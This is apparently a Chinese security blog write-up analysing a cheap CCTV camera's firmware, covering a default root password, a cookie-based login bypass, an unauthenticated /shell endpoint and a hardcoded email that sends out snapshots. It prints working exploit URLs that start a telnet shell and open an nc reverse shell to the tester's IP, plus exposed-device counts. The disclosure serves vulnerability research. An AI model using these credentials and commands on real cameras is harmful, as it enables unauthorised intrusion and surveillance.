# 某CCTV摄像头漏洞分析

0x00 漏洞分析
=========

* * *

今天看老外分析了一款廉价CCTV摄像头的文章，地址在[https://www.pentestpartners.com/blog/pwning-cctv-cameras/](https://www.pentestpartners.com/blog/pwning-cctv-cameras/)，摄像头的amazon购买地址是[http://www.amazon.co.uk/dp/B0162AQCO4](http://www.amazon.co.uk/dp/B0162AQCO4)，老外曝光的漏洞主要有四个，分别是默认密码，web登陆认证绕过，内建的webshell，以及发送摄像图片到硬编码的邮箱地址，老外的文章经过我的测试，有错误和不全的地方，我都一一补充在下面了 ：）

### 1. 默认密码

WEB默认登陆名是admin，密码是空。

另外经过破解passwd，发现root的默认密码是"juantech"，可以通过telnet登录直接获取cmdshell，如图1:

![enter image description here](http://drops.javaweb.org/uploads/images/eb420eb943acfbe8be0125d9f77a55bedaa833cd.jpg)

### 2. WEB认证绕过

当你第一次访问的时候，index.html会要求你输入用户名和密码，输入正确，则跳转到view2.html。如果你直接访问view2.html，会被重定向到index.html，要求你输入帐户信息。下载固件用binwalk解压，如图2：

![enter image description here](http://drops.javaweb.org/uploads/images/baefef2743a4b6d333a569ce000fe139af8be2fa.jpg)

查看view2.js，发现以下内容：

```
$(document).ready(function(){
    dvr_camcnt = Cookies.get(“dvr_camcnt");
    dvr_usr = Cookies.get("dvr_usr");
    dvr_pwd = Cookies.get("dvr_pwd");
    if(dvr_camcnt == null || dvr_usr == null || dvr_pwd == null)
    {
        location.href = "/index.html";
    }

```

可以看到，如果`dvr_camcnt,dvr_usr,dvr_pwd`这3个值为空，就会跳转到index.html，所以我们只要将`dvr_camcnt,dvr_usr,dvr_pwd`设置不为空就可以了，通过查看view2.js源码可以知道,`dvr_camcnt`其实是控制频道(chanel)的，如下：

```
function goto_open_all()
 80 {   
 81     if(dvr_viewer && dvr_viewer.ConnectRTMP)
 82     {
 83         dvr_viewer.SetPlayerNum(dvr_camcnt);
 84 //      switch(dvr_camcnt)
 85 //      {
 86 //      case "4":
 87 //          dvr_viewer.flSetViewDiv(4);
 88 //          break;
 89 //      case "8":
 90 //          dvr_viewer.flSetViewDiv(9);
 91 //          break;
 92 //      case "16":
 93 //          dvr_viewer.flSetViewDiv(16);
 94 //          break;
 95 //      case "24":
 96 //          dvr_viewer.flSetViewDiv(25);
 97 //          break;
 98 //      }
 99         open_all(dvr_camcnt);
100     }
101     else
102     {
103         dvr_viewer = $("#viewer")[0];
104         setTimeout(goto_open_all, 1000);
105     }
106 }   

```

原文说dvr_camcnt只能设置2，4，8，24这几个值。实际测试，输入其他值都可以的。绕过登陆认证的证明如图3

![enter image description here](http://drops.javaweb.org/uploads/images/879e0cba40832f23301599c84f39e105b3e81151.jpg)

### 3.内建的webshell

通过查看解压后的固件目录，我们发现dvr_app包含了web服务，使用strings查看`dvr_app`二进制，可以看到`/moo,/whoami,/shell,/snapshot`等字符，尝试访问，发现没有任何验证就可以访问这些功能，如图4，

![enter image description here](http://drops.javaweb.org/uploads/images/a21a81561479ab14799d64a327beb28671a31026.jpg)

访问`/shell`的时候，卡住了，把`dvr_app`拖入ida，查看shell功能相应的处理逻辑，因为是固件是ARM小端的架构，可以直接在IDA里F5看伪代码。如图5

![enter image description here](http://drops.javaweb.org/uploads/images/ddb835b8abea7d949fdb7a9398deb7893ab1b0ac.jpg)

这里利用有2个方式，一个是直接telnetd绑定/bin/sh到任意端口，然后telnet连接过去，不需要认证就可以telnet登录，这个利用方式在你不知道固件本身TELNET的账户信息的时候，是个很常见的利用方法。命令如下：

```
http://目标ip/shell?/usr/sbin/telnetd -l/bin/sh -p 25

```

但是实际测试还要考虑防火墙/NAT的问题，好多设备仅仅映射80出来，你开通的其他端口，虽然设备打开了，但是你连接不上去。如图6.

![enter image description here](http://drops.javaweb.org/uploads/images/2bd2664df58e91f790c357db9d6482e2b5e32032.jpg)

这时候你可以用nc反弹shell出来，估计是因为固件版本不一样，我测试的目标busybox里是自带nc的，所以通过执行

```
http://目标ip/shell?/bin/busybox nc 我的IP 53 -e /bin/sh

```

就可以获取到反弹的cmdshell了，如图7

![enter image description here](http://drops.javaweb.org/uploads/images/81f574d4e56c9a1ba71853d2f86ef2e49150ed58.jpg)

文章说他的固件的busybox没有带nc，所以他静态编译了一个busybox，然后通过wget下载到一个可写的目录，然后赋予busybox可执行权限，最后运行nc命令。他已经提供了编译好的busybox，可以通过`http://212.111.43.161/busybox`来下载。

### 4.发送摄像图片到硬编码的邮箱地址

通过strings查看dvr_app二进制,还发现了另一处可疑的字符串

.rodata:002260E0 0000005A Ctarget=lawishere@yeah.net&subject=Who are you?&content=%s&snapshot=yes&vin=0&size=320x180

通过在github上搜索“lawishere@yeah.net",找到了https://github.com/simonjiuan/ipc/blob/master/src/cgi_misc.c，通过源码可以看到

```
#define DEFAULT_USER_EMAIL "dvruser@esee100.com"
#define DEFAULT_USER_PASSWORD "dvrhtml"
#define DEFAULT_SMTP_SERVER "mail.esee100.com"
#define DEAFULT_TARGE_EMAIL "lawishere@yeah.net"

```

@hdmoore在twitter也提到这个中国邮箱，所以我略微的看了看。目前mail.esee100.com已经不解析了，但是esee100.com的CNMAE解析到了www.dvrskype.com。通过查询www.dvrskype.com的域名信息，可以看到域名的拥有者是caostorm@163.com，如图8，注意这里ORG是"广州市九安光电技术有限公司",而github的上传者也是九安光电技术的技术人员。通过图9可以看到，他会把/whoami的返回信息和CCTV摄像头启动时的拍摄的照片发到lawishere@yeah.net，当然现在这个SMTP发送服务器已经不存在了，也有可能是当时开发留下的测试的功能。

0x01 全球统计
=========

* * *

因为是运行的自定义的web服务器，HTTP服务器头包含明显的“JAWS/1.0”特征，最近sans比较关注国内的漏洞扫描（https://isc.sans.edu/forums/diary/Scanning+for+Fortinet+ssh+backdoor/20635/），所以我就直接用shodan的结果了。如图10

![enter image description here](http://drops.javaweb.org/uploads/images/cd90a2430208049c79afd528302d4e685a88a09f.jpg)

可以看到这款廉价的CCTV摄像头对公网开放的全球大概有42545台，最常用的端口是80/8080，用的最多的国家是土耳其，印度，越南。 ：）

目前应该也有对这个CCTV摄像头的自动化恶意利用了，通过查看几个，发现几台设备的进程里都包含

```
 1560 root       620 S    ./dropbear -p 15081 -r /tmp/dropbear/dropbear_rsa_ho

```

以及wget远程下载恶意利用文件。

0x02 漏洞防护
=========

* * *

目前官方还没有补丁固件，建议不要对外开放80/23等管理端口。

0x03 感谢的人
=========

* * *

感谢低调的张老师教我逆向知识，张老师的好和善是对我问的幼稚问题都耐心的回答，从来没烦过。